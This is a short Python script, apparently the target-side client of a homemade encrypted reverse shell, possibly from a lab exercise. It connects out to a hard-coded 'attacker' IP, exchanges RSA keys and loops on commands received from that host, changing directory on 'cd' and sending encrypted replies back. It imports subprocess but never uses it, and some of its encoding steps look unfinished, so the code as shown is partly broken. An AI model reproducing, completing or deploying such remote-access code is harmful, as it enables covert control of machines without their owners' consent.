from cryptidy import asymmetric_encryption
import socket
import subprocess
import os
import base64

HOST = '10.0.2.4'  # Attacker's IP address
PORT = 12345  # Same port number used in the listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
print(f'target priv key: {priv_key}')
print(f'target pub key: {pub_key}')
s.send(pub_key.encode())

attacker_pub_key = s.recv(256).decode()
print(f'attacker pub key: {attacker_pub_key}')

try:
    while True:
        data = s.recv(1024)
        print(f"data.decode(): {data.decode()}")
        if data[:2].decode() == 'cd':
            os.chdir(data[3:].decode())
        if len(data) > 0:
            encrypted_data = asymmetric_encryption.encrypt_message(data.decode(), attacker_pub_key)
            encrypted_data_b64 = encrypted_data.encode()
            s.send(encrypted_data_b64)
        else:
            s.send(b' ')
except ConnectionResetError as e:
    print('attacker disconnected')
s.close()
